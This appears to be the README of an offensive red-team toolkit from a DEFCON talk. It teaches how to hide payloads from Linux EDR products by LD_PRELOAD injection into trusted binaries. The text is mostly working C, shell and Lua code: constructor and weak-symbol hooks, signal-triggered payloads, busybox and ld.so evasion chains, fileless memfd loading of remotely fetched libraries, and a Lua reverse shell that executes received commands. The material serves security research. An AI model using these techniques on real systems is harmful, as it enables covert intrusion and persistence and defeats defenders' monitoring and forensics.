# Zombie Ant Framework: Practical Primitives for Playing Hide and Seek with Linux EDRs.

<!-- TOC -->

- [Zombie Ant Framework: Practical Primitives for Playing Hide and Seek with Linux EDRs.](#zombie-ant-framework-practical-primitives-for-playing-hide-and-seek-with-linux-edrs)
    - [Inspiration](#inspiration)
    - [Introduction](#introduction)
    - [Objectives](#objectives)
    - [Part 1: Practical Primitives for working with offensive preloading:](#part-1-practical-primitives-for-working-with-offensive-preloading)
    - [Part 2: Impementing the concepts](#part-2-impementing-the-concepts)
    - [A General Direction to meet our objectives](#a-general-direction-to-meet-our-objectives)
        - [*Hooking*](#hooking)
        - [*Preloading*](#preloading)
    - [Part 1: Practical Primitives for working with offensive preloading](#part-1-practical-primitives-for-working-with-offensive-preloading)
        - [Structure of an ELF binary, role of the linker](#structure-of-an-elf-binary-role-of-the-linker)
        - [Practical Techniques and Cases](#practical-techniques-and-cases)
            - [0x0: .INIT/.FINI](#0x0-initfini)
            - [0x01: __libc_start_main()](#0x01-__libc_start_main)
            - [0x02: Weak symbol references: gcc  __attribute__((weak))](#0x02-weak-symbol-references-gcc--__attribute__weak)
                - [Ox02:A. Controlled Weak Refs](#ox02a-controlled-weak-refs)
                - [Ox02:B: Foreign Weak Refs](#ox02b-foreign-weak-refs)
                - [0x2:C: Chained weakrefs](#0x2c-chained-weakrefs)
            - [0x3: .CTOR/.DTOR via gcc __attribute__((constructor (P))) and __attribute__((destructor (P)))](#0x3-ctordtor-via-gcc-__attribute__constructor-p-and-__attribute__destructor-p)
                - [0x03:A Direct constructors and descructors](#0x03a-direct-constructors-and-descructors)
                - [0x3:B Chained / prioritized constructors and destructors](#0x3b-chained--prioritized-constructors-and-destructors)
            - [#0x3:C Hijacking CTOR arguments.](#0x3c-hijacking-ctor-arguments)
            - [Ox4: Out of band signals and exception handlers, timed execution and fault branching](#ox4-out-of-band-signals-and-exception-handlers-timed-execution-and-fault-branching)
                - [0x4:A Direct external signalshandlers e.g. SIGHUP, SIGUSR1/2](#0x4a-direct-external-signalshandlers-eg-sighup-sigusr12)
                - [0x4:B. A variation on the theme: Fault based (SIGFPE) handlers](#0x4b-a-variation-on-the-theme-fault-based-sigfpe-handlers)
    - [Expanding and Scaling the evasion capabilities](#expanding-and-scaling-the-evasion-capabilities)
        - [0x1. Inline Evasion via `busybox` and `ld.so` loader](#0x1-inline-evasion-via-busybox-and-ldso-loader)
            - [0x2: Hiding behind reflective giants](#0x2-hiding-behind-reflective-giants)
            - [0x3: Embedding Interpeters](#0x3-embedding-interpeters)
                - [0x3:A: Scripters into shared libraries](#0x3a-scripters-into-shared-libraries)
                - [0x3:B: Bringing Lua libraries](#0x3b-bringing-lua-libraries)
    - [Weaponizing preloads](#weaponizing-preloads)
        - [PSEVADE](#psevade)
        - [Payload Brokers: ZAF Service](#payload-brokers-zaf-service)
        - [Catch 22: dynamic cradles](#catch-22-dynamic-cradles)
            - [.SO preload](#so-preload)
            - [.BIN exec](#bin-exec)
        - [Protecting your cradles](#protecting-your-cradles)
            - [Race to preload](#race-to-preload)
        - [No Main(), no gain ..?](#no-main-no-gain-)
    - [TODOs and REFs](#todos-and-refs)
        - [Other Ideas](#other-ideas)
        - [Research](#research)
    - [REFS](#refs)

<!-- /TOC -->
Abstract:

```txt
Endpoint Detection and Response solutions have landed in Linux. With the ever increasing footprint of Linux machines deployed in data centers, threat actors have been forced to move cross platform in the presence of new defensive capabilities. EDRs have their challenges in covering Linux landscape, and as such they come in various designs and address defense differently. Some focus on sandboxing, others place more effort on execution heuristics, yet others provide facilities to create restricted shells and exist in support of an enterprise policy, augmenting already existing solutions with whitelisting executables on systems. 

On a recent Red Team engagement our team was faced with overcoming a commercial EDR on Linux. In this talk we wanted to share a few techniques we used to slide under the EDR radar, and expand offensive post-exploitation capabilities on a farm of hardened Linux machines. As they say, when EDRs give you lemons ... you turn them into oranges, and let EDRs make lemonade ;)

Specifically, we will see how pristine (often approved) executables could be subverted to execute foreign functionality avoiding runtime injection or common anti-debugging signatures the defense is looking for. We will walk through the process of using well known capabilities of a dynamic loader, take lessons from user-land root-kits in evasion choices, and attempt to lead DFIR teams on a wild goose chase after the artifacts of a compromise.

Many of the details that went into such evasion could be generalized and possibly reused against other EDRs. We fully believe that the ability to retool in the field matters, so we distilled the techniques into reusable code patterns and a small toolkit which will be used as a basis for our discussion. 

Compelling known good executables to misbehave is so much fun (and profit)!
```

-----

DEFCON refs: 
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Rozner
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#McGrew
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Gangwere
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Tarquin
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Singe
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Krotofil
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Metcalf
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Marcelli
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#0x200b
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Martin2
https://www.defcon.org/html/defcon-26/dc-26-speakers.html#Cano1


## Inspiration


Ladybirds or ants?

https://cosmosmagazine.com/biology/wasps-turn-ladybirds-zombies


```txt
One of Earth’s weirdest natural phenomena: zombie ants

These are carpenter ants in tropical locations, infiltrated and controlled by Ophiocordyceps unilateralis sensu lato, sometimes called zombie ant fungus. This fungal body-snatcher forces ants to a forest understory and compels them to climb vegetation and bite into the underside of leaves or twigs, where the ants die. The invasion culminates with the sprouting of a spore-laden fruiting body from a dead ant’s head. The fungus thereby benefits because infectious spores are released onto the ground below, where they can infect other foraging ants. The new research shows that the fungal parasite accomplishes all this without infecting the ants’ brains.

We found that a high percentage of the cells in a host were fungal cells. In essence, these manipulated animals were a fungus in ants’ clothing.

Normally in animals, behavior is controlled by the brain sending signals to the muscles, but our results suggest that the parasite is controlling host behavior peripherally. Almost like a puppeteer pulls the strings to make a marionette move, the fungus controls the ant’s muscles to manipulate the host’s legs and mandibles.

We hypothesize that the fungus may be preserving the brain so the host can survive until it performs its final biting behavior — that critical moment for fungal reproduction. But we need to conduct additional research to determine the brain’s role and how much control the fungus exercises over it.

David Hughes, associate professor of entomology and biology at Penn State
```

## Introduction

On a recent engagement our team was faced with hiding from a commercial EDR on Linux. We wanted to share a few techniques that helped us persist on the target. 

## Objectives

- Hide naked payloads from EDRs, persistenly in userland.
- Use of approved system resident binaries as dynamic decoys for your operation, breaking EDR heuristics, shallow signature checking.

We will explore the following practical concepts:

## Part 1: Practical Primitives for working with offensive preloading:

- Showcasing and reviewing in-code techniques available with the Linux Linker to assist in achieving the "preload and release" effect in the approved binaries without patching or fully modifying them at runtime.
- Malicious library preloads without full knowledge of the internal details of the target binaries.
- Using library preloading in novel ways over memory.
- Practical preload library chaining in a "split and scatter" fashion to blind EDR heuristics, post mortem forensics, and to gain delayed functionality or features at runtime.
- Widening the persistence footprint and achieving rapid payload prototyping by post-loading cradles with scripting functionality. 

## Part 2: Impementing the concepts

- In-memory payloads
- Remote loading, Payload brokers
- Mimicry and Decoys
- Zombie Ant Farm: A set of reusable promitives and assistive code constructs an offensive operator can use in the field today.

## A General Direction to meet our objectives

### *Hooking*

Functionally, hooking an API assumes that you are implementign an API detour and:

- you know how the target API is working, or have a reasobale idea on it's exposed interfaces.
- you have the ability to target it without detection. E.g. prace attach, debugger activity, presence of known tools and libraries for interception, known behavioral signatures.
- you have the ability to interoperate with the target binary in a clean fashion without crashing it, implment call filters and to extend hooks as needed at runtime.
- you also may need to have inspection tooling on remote target which may weaked your offensive OpSec. E.g. to hook *that specific use case*, while the mom is watching

These options can be loud or you simply may not have the proper setup to use the remote prod as your dev.

### *Preloading*

Preloading isntructs the linker to patch your libraries containing desired code into the memory space of a target process at the start of the target process.

In comparison to hooking, what if you could be more agnostic to the exact application API you are trying to control. Given the objectives you could:

- Preload payload into pristine binary at known target addresses, and release the original binary for full execution. you payload executes in the memory space of the target process.

- Find ways to inject/preload generically, irrespective of the available API. We do not need to hook aa specific set of APIs since we are not trying to subvert the target but only hide behind it. 

- Expand features out of band by:
	- feature loading via chained preloads
	- feature loading via weak references
    - feature loading via dynamic scripting
    - feature loading via payload broker hosts

Our goal is to gain a few points:

- DFIR lifting target executable gets non-modified, clean exe
- EDRs see code executing by approved binaries.
- EDRs may not be able to fully trace inter-process data handoff (pipes, POSIX shared memory, code ove sockets, memory resindent executables and shared libraries available over file ephemeral file descriptors) 
- Not rely on dlopen() as it may be traced or hooled by EDRs.

    > Note: dlopen() API allows you to use libraries that you do not depend on directly (and which may or may not be present on the system at the time of invocation). In case of preloading, the libraries that you do depend on directly (such as libc.so, or <your_payload>.so) do not need to be dlopen()'ed as the loader will have already mapped them for you before your program starts, and are not optional as the loader will fail hard if they are missing.

## Part 1: Practical Primitives for working with offensive preloading

### Structure of an ELF binary, role of the linker

### Practical Techniques and Cases

#### 0x0: .INIT/.FINI

[Ref:] (http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html)

`.init`

> This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).
The .init and .fini sections have a special purpose. If a function is placed in the .init section, the system will execute it before the main function. Also the functions placed in the .fini section will be executed by the system after the main function returns. This feature is utilized by compilers to implement global constructors and destructors in C++.

`.fini`

> This section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.

When an ELF executable is executed, the system will load in all the shared object files before transferring control to the executable. With the properly constructed .init and .fini sections, constructors and destructors will be called in the right order.

```c
static void init(int argc, char **argv, char **envp) {
    /* offensive code */
    puts(__FUNCTION__);
}

static void fini(void) {
    /* delayed offensive code */
    puts(__FUNCTION__);
}

__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
__attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini;

int main(void) { /* your code here */ return 0; }
```

#### 0x01: __libc_start_main()

[Ref]: (http://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html)
[Ref]: (https://linuxgazette.net/issue84/hawk.html)

```txt
The `__libc_start_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function.

__libc_start_main() is not in the source standard; it is only in the binary standard
```

General idea:
[Ref]: (https://gist.github.com/apsun/1e144bf7639b22ff0097171fa0f8c6b1)

```c

/* Trampoline for the real main() */
static int (*main_orig)(int, char **, char **);

/* Our fake main() that gets called by __libc_start_main() */
int main_hook(int argc, char **argv, char **envp)
{
    int ret = main_orig(argc, argv, envp);
    return ret;
}

/*
 * Wrapper for __libc_start_main() that replaces the real main
 * function with our hooked version.
 */
int __libc_start_main(
    int (*main)(int, char **, char **),
    int argc,
    char **argv,
    int (*init)(int, char **, char **),
    void (*fini)(void),
    void (*rtld_fini)(void),
    void *stack_end)
{
    /* Save the real main function address */
    main_orig = main;

    /* Find the real __libc_start_main()... */
    typeof(&__libc_start_main) orig = dlsym(RTLD_NEXT, "__libc_start_main");

    /* ... and call it with our custom main function */
    return orig(main_hook, argc, argv, init, fini, rtld_fini, stack_end);
}
```

file: ext/hax.so

#### 0x02: Weak symbol references: gcc  __attribute__((weak))

>gcc(1):
`weak` The weak attribute causes the declaration to be emitted as a weak symbol rather than a global. This is primarily useful in defining library functions which can be overridden in user code, though it can also be used with non-function declarations. Weak symbols are supported for ELF targets, and also for a.out targets when using the GNU assembler and linker.

>nm(1):
`w` The symbol is a weak symbol that has not been specifically tagged as a weak object symbol.  When a weak defined symbol is linked with a normal defined symbol, the normal defined symbol is used with no error.  When a weak undefined symbol is linked and the symbol is not defined, the value of the symbol is determined in a system-specific manner without error.  On some systems, uppercase indicates that a default value has been specified

Explanation:
`main` does not dlopen(). DFIR can take the main: main is clean, unless execution context is known and LD_PRELOAD is seen

##### Ox02:A. Controlled Weak Refs

Weak symbols can be created in *your* shim/cradle . The idea is: main is a clean executable with exploit delivered in libweakref.so out of band

Example: 

main() calls weak debug() found in libweakref:debug() 

`main.c`:

```c
void debug() __attribute__((weak));
int main(void)
{
    if (debug) { // IF loaded / resolved 
        printf("main: debug()\n");
        debug(); // resolved at runtime
    }
    return 0;
}
```

`libweakref.so`:
```c
void debug() __attribute__((weak));
// Weak ref check example. Alternative to dlopen()
void debug(){
    printf("libweakref.so: debug()\n");
}
```

Example:

```sh
$LD_PRELOAD=lib/libweakref.so bin/main_weakref
```

##### Ox02:B: Foreign Weak Refs

You can hunt for existing Linux *known good* executables:

```sh
$file /bin/ls
/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3f60bd5f1fee479caaed0f4b1dc557a2086d3851, stripped
```

```sh
$nm /bin/ls
nm: /bin/ls: no symbols
```

Shipped with stripped symbols, however:

```sh
$nm --dynamic  /bin/ls | grep 'w '
w __cxa_finalize
w __gmon_start__
w _ITM_deregisterTMCloneTable
w _ITM_registerTMCloneTable
```

Or shipped unstripped (e.g. /usr/bin/java):

```sh
$nm /usr/bin/java | grep 'w '
w __gmon_start__
w _Jv_RegisterClasses
```

Symbols `__gmon_start__` and `__cxa_finalize` seem to be present and weak. We can preload most of ELF executables in our code:

`libweakref.so`:

```c
// Injection to any ELF
void __gmon_start__(){
     if (gmon_ct < 1 ){
       printf("in __gmon_start__ weak hook\n");
       gmon_ct++;

     }else{
       printf("in __gmon_start__ weak hook but already started\n");
     }
}

// Evasion trampoline (atexit hook)
void __cxa_finalize() {
     if (cxa_ct < 1 ){
         printf("in __cxa_finalize weak hook\n");
         cxa_ct++;

     }else{
         printf("in __cxa_finalize weak hook but already started\n");
     }
}

```

Example:

```sh
$LD_PRELOAD=./liblibweakref.so /bin/ls
``` 

-or-

```sh
$LD_LIBRARY_PATH=$LD_LIBRARY_PATH:../lib LD_PRELOAD=libweakref.so /bin/ls
```

```sh
$LD_PRELOAD=lib/libweakref.so /bin/ls
in __gmon_start__ weak hook
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

Note:

> Here we are escaping double-execution of a hook by checking if `__gmon_start__` is already hooked

> As you can see with weak symbols we are not explictly working with dlopen()/dlsym()) RTLD_*'s. WE only want our code to execute in the context of a live whitelisted executable using it as a decoy. Liveness of it (no crash) and proper appearance in the process table is prioritized.
Note3: `__cxa_finalize` invocation is not always possible.

##### 0x2:C: Chained weakrefs

We can evade even deeper by scattering weak references across preloaded libraries, and asemble the payload in memory.
Same technique as in the first scenarion (main) but weak symbols are exported from the downstream library

Explanation:

> main:main() -> calls libwearkerf.so:debug() ->  calls libweakref2:mstat() 

`main.c`:

```c
void debug() __attribute__((weak));
void mstat() __attribute__((weak)
int main(void)
{
    if (debug) {
        printf("main: debug()\n");
        debug();
    }

    if (mstat) {
        printf("main: test trampoline to stat()\n");
        mstat();
    }
}
```

`libweakref.so`:

```c
void debug() __attribute__((weak));
void mstat() __attribute__((weak)
void debug(){
    printf("debug()\n");

    if (mstat) {
        printf("debug: mstat()\n");
        mstat();
    }
}
```

`libweakref2.so`:

```c
void mstat() __attribute__((weak)
void mstat(){
    printf("mstat()\n");
}
```

Example:

```sh
$LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref
```

```sh
$LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref 
in __gmon_start__ weak hook
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
main: debug()
debug()
debug: stat()
mstat()
main: test trampoline to stat()
mstat()
in __cxa_finalize weak hook
in __cxa_finalize weak hook but already started
in __cxa_finalize weak hook but already started
```

#### 0x3: .CTOR/.DTOR via gcc __attribute__((constructor (P))) and __attribute__((destructor (P)))

So this is how we are planning to execute our "preload and release" approach in a binary agnostic manner.

Highlights:

- Direct constructors and descructors
- Chained / prioritized constructors and destructors
- Hijacking arguments. 

[Ref:] (https://gcc.gnu.org/onlinedocs/gccint/Initialization.html)

[Ref:] (https://gcc.gnu.org/onlinedocs/gcc-4.3.0/gcc/Function-Attributes.html)

##### 0x03:A Direct constructors and descructors

Explanation:

```c
//immediate invocation
void before_main(void) __attribute__((constructor ));
void before_main(void)
{

    /* This is run before main() */
    printf("Before main()\n");

}

//delayed invocation
void after_main(void) __attribute__((destructor ));
void after_main(void)
{

    /* This is run after main() returns (or exit() is called) */
    printf("After main()\n");

}
```

Example:
```sh
$LD_PRELOAD="lib/libmctor.so" /bin/ls 
Before main()
bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

##### 0x3:B Chained / prioritized constructors and destructors

Explanation: TBD.
Priority ranges: `101 ... 65535`

```c
void before_main(void) __attribute__((constructor (101)));

void after_main(void) __attribute__((destructor(65534) ));
```

#### #0x3:C Hijacking CTOR arguments.

A Constructor called by `ld.so` before `main()`. Conceivably we can hijack parameterized versions of `main()`. This is not guaranteed but works. `¯\_(ツ)_/¯`

```c
__attribute__((constructor)) static void mctor(int argc, char **argv, char** ennvp)
```

#### Ox4: Out of band signals and exception handlers, timed execution and fault branching

Explanation: non-linear invocation of code for evasion. We break the EDR "story" with out of band interrupts. We can combine that with other methods. This achieves deeper evasion by triggering code from otherwise dormant code branch.

##### 0x4:A Direct external signalshandlers e.g. SIGHUP, SIGUSR1/2

TODO: clearly split off from src/intrp.c  to showcase capability

`libinterrupt.so`:

```c
void before_main(void) __attribute__((constructor));
void before_main(void)
{
    printf("Before main()\n");
    setSigHandler(500000);
}
void setSigHandler(int sleep_interval){

    signal(SIGHUP, handleSigHup);
    for (;;) {
        if (gotint)
            break;
        usleep(sleep_interval);
    }
    doWork();

}
void handleSigHup(int signal) { gotint = 1; }
void doWork(void){
    printf("Executing payloads here ...\n");
}

```

Example:

```sh
$LD_PRELOAD=lib/libinterrupt.so /bin/ls
```


```sh
Before main()
Setting SIGHUP Signal handler ...
PPID: 23305 PID: 126946 

...
<out of band KILL -HUP here>
...

Signal handler got signal ... 
Executing payloads here ...

bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

> Note: External asynchronous trigger of a code branch. This can also help with sandbox profiling.

##### 0x4:B. A variation on the theme: Fault based (SIGFPE) handlers

Expanation: self-triggered fault (e.g. division by 0) and recovery handler. 
Payload is left in the recovery handler code. Keeping the decoy process alive, but evading IoC chain detection.

```sh
$LD_PRELOAD=lib/libinterrupt.so /bin/ls
```

```sh
$LD_PRELOAD=lib/libinterrupt.so bin/main
Before main()
Trigger SIGFPRE handler
In SIGFPE handler
1 / 0: caught division by zero!
Executing payloads here ...
```

## Expanding and Scaling the evasion capabilities

Or, _Guiding the ant to it's final destination._

Highlights:

- Hiding from EDRs via existing trust binaries decoys.
- Expanding dynamic scripting capabilities in the field.
- Progressive LD_PRELOAD command line evaders.
- Evaders with Self-preservation instincts.

### 0x1. Inline Evasion via `busybox` and `ld.so` loader

Examples:

```sh

$/bin/busybox /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  ls 

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  find /bin -name cat -exec /bin/ls / \;

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  nc -f /dev/pts/0  -e /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  openvt -c 5  -w /bin/ls > /tmp/ls.out

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so script -c /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so busybox setsid  -c /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so start-stop-daemon -x /bin/ls --start

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so taskset 0x00000001 /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so echo | xargs /bin/ls

$ echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/ls
```

Example of advanced evasion:

1.Find action on executables to preload

```sh
$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts  --regex '^main_.*$' ./bin/
```

2.Double link evasion

```sh
$ mkdir /tmp/shadowrun; ln -s /bin/ls /tmp/shadowrun/ls; LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts   /tmp/shadowrun/
```

3.Chaining evasion

```sh
echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/busybox xargs xargs /bin/busybox /bin/ls

echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls

echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox time /bin/ls
```

4. Evade via TTY switch

```sh
vi -ensX $(/lib64/ld-linux-x86-64.so.2 /bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2  vi -ensX $(/bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'
```

#### 0x2: Hiding behind reflective giants

(and expanding across tech stack to more rapid payload prototypes)

TBD: cgo

#### 0x3: Embedding Interpeters

- Evade into more reflection and back.

##### 0x3:A: Scripters into shared libraries

`invoke_lua.c`:

```c
#include <lua.h> 
#include <lauxlib.h>
#include <lualib.h> 

#include <stdlib.h> 
#include <stdio.h> 

void bail(lua_State *L, char *msg){
    fprintf(stderr, "\nFATAL ERROR:\n  %s: %s\n\n", msg, lua_tostring(L, -1));
    exit(1);
}

int main(int argc, char** argv)
{

    if (argc !=2){
        printf("Usage %s </path/to/script.lua>\n", argv[0]);
        return 1;
    }

    lua_State *L;

    L = luaL_newstate();                  /* Create Lua state variable */
    luaL_openlibs(L);                     /* Load Lua libraries */

    if (luaL_loadfile(L, argv[1]))        /* Load but don't run the Lua script */
    bail(L, "luaL_loadfile() failed");    /* Error out if file can't be read */

    printf("In C, calling Lua\n");

    if (lua_pcall(L, 0, 0, 0))            /* Run the loaded Lua script */
    bail(L, "lua_pcall() failed");        /* Error out if Lua file has an error */

    printf("Back in C again\n");

    lua_close(L);                         /* Clean up, free the Lua state var */
    return 0;
}

```

```sh
ldd invoke_lua
    linux-vdso.so.1 (0x00007ffd0036a000)

    ...
    liblua.so => not found
    ...

    libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc0c0cb1000)
    ....
```

This is and opportunity to fill the void.

- Scatter gather payloads residing in dependencies. You have all, or it does not run. 
- Invoke lua script via `C` shim preloading `liblua.so` as dependency:

Exmaple:

```sh
$LD_LIBRARY_PATH=. LD_PRELOAD=./liblua.so ./invoke_lua hello.lua
```

##### 0x3:B: Bringing Lua libraries

- Another abstraction layer

```lua
print(package.path..'\n'..package.cpath)

-- via cpath
package.cpath = './slibs/?.so;'
print("Cpath:"..package.cpath)
local socket = require('socket')
local tcp = assert(socket.tcp());

local server = assert(socket.bind("127.0.0.1", 8081))
-- find out which port the OS chose for us
local ip, port = server:getsockname()
print("Server on " .. ip .. ":"..port)

-- via path
local rhost = "127.0.0.1"
local rport = "1337"
assert(tcp:connect(rhost,rport));
  while true do
    local r,x=tcp:receive()
    local fin=assert(io.popen(r,"r"))
    local data=assert(fin:read("*a"));
    tcp:send(data);
  end;
fin:close()
tcp:close()
```

## Weaponizing preloads

Highlights:

- Inline command evasion
- Remote .so loads
- Load via memfd_create() > 3.17 or legacy (/dev/shm)

### PSEVADE

TBD

### Payload Brokers: ZAF Service

TBD

### Catch 22: dynamic cradles

#### .SO preload

```sh
$ pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -d bash -c /bin/ls
```

```sh
$ ls -l /proc/56417/fd
lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:55 1 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:55 2 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:54 3 -> '/memfd:K2J5S6N4 (deleted)'
lr-x------ 1 root root 64 Feb 17 17:55 4 -> /dev/urandom
lr-x------ 1 root root 64 Feb 17 17:55 5 -> 'pipe:[3478476]'
lr-x------ 1 root root 64 Feb 17 17:55 7 -> 'pipe:[3478477]'
```

```sh
$ ls -l /proc/56418/fd
lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
l-wx------ 1 root root 64 Feb 17 17:55 1 -> 'pipe:[3478476]'
l-wx------ 1 root root 64 Feb 17 17:55 2 -> 'pipe:[3478477]'
```

Where is Waldo?

```sh
56417 pts/6    S+     0:00                  |   |   |   \_ bash
56418 pts/6    S+     0:00                  |   |   |       \_ /bin/ls
```

#### .BIN exec

```sh
$ pypreload.py  -t bin -l http://127.0.0.1:8080/zaf -d bash
```

Note: the parent is gone (pypreload cradel), binary loaded (ZAFSrv)

```sh
$ ls -l /proc/56509/fd/
lr-x------ 1 root root 64 Feb 17 18:08 0 -> /dev/null
l-wx------ 1 root root 64 Feb 17 18:08 1 -> /dev/null
lrwx------ 1 root root 64 Feb 17 18:08 2 -> /dev/null
l-wx------ 1 root root 64 Feb 17 18:08 3 -> /tmp/_mf.log
lrwx------ 1 root root 64 Feb 17 18:08 4 -> '/memfd:fa37Jn (deleted)'
lrwx------ 1 root root 64 Feb 17 18:08 5 -> 'socket:[3479923]'
```

Strace sees:

```log
56880 18:26:52.395703 memfd_create("R6YP4OOR", MFD_CLOEXEC) = 3
56884 18:26:52.586221 readlink("/proc/self/exe", "/memfd:R6YP4OOR (deleted)", 4096) = 25
56886 18:26:52.624087 memfd_create("", MFD_CLOEXEC) = 4
56886 18:26:52.632680 memfd_create("fa37Jn", MFD_CLOEXEC) = 4
```

### Protecting your cradles

TBD: 

#### Race to preload

So what if someone used `.init` et al to preload your shims. e.g. sandbox

Q: Remember `.init_array` ... ?

A: Yes, and I counter: `.preinit_array`

```c
__attribute__((section(".preinit_array"), used)) static typeof(preinit) *preinit_p = preinit;
```

```sh
$ LD_PRELOAD=ext/hax.so bin/main_init 
preinit
init
argv[0] = bin/main_init
--- Before main ---
main
fini
```

### No Main(), no gain ..?

1.TODO:

`nomain.c`:

```c
// gcc -nostartfiles -o nomain nomain.c 
/* when called :
    $ LD_PRELOAD="./nomain" /bin/cat 
        ctor invokes, "main" does not 

    when called :
    $ ./nomain 
        ctor invokes, "main" invokes
*/
__attribute__((constructor)) static void myctor(int argc, char **argv, char* envp[]){

    printf("in ctor\n");
}
int _(void);
void _start()
{
    int x = _(); //calling custom main function 
    exit(x);
}
int _() {
    printf("in main: %s\n", __FUNCTION__);
    while (1) ;
    return 0;
}
```

2.TODO: Hiding in plain symbol sight

`nomain_entry.c`:

```c
int _(void);
void __data_frame_e()
{ 
    int x = _(); //calling custom main function 
    exit(x);
} 
int _() {
    printf("in main: %s\n", __FUNCTION__);
    while (1) ;
    return 0;
}
```

3.TODO: Alternative ELF loaders.

If you are allowed to bring in other elf loaders:

`nomain_interp.c`:

```c
// gcc -shared -Wl,-e,fn_no_main nomain.c -o nomain.so

// 1. Static patch via 
// $ patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2

// Dynamic assaignment to .interp section:

//Was: const char my_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";

// Now:
const char my_interp[] __attribute__((section(".interp"))) = "/usr/local/bin/gelfload-ld-x86_64";

int fn_no_main() {
    printf("This is a function without main\n");
    exit(0);
}
```

## TODOs and REFs

libctx:

- fully clean LD_PRELOAD  in ctor of an injector )libctx)
- weak attributes modules load from libctx
- multilib loading in LD_PRELOAD
- JNI LD_PRELOAD
- execve LD_PRELOAD putenv?
- rename in .ctor

ZAF:

- ZAfsrv as .so, loadable into known process 

### Other Ideas

- https://github.com/daveho/EasySandbox

### Research

TODO: SWIG http://swig.org/tutorial.html

## REFS

REF: https://x-c3ll.github.io/posts/fileless-memfd_create/
REF: https://0x00sec.org/t/super-stealthy-droppers/3715
REF: https://github.com/lattera/glibc/blob/master/csu/gmon-start.c
REF: https://stackoverflow.com/questions/12697081/what-is-gmon-start-symbol
REF: Adopted from https://github.com/dvarrazzo/py-setproctitle/tree/master/src
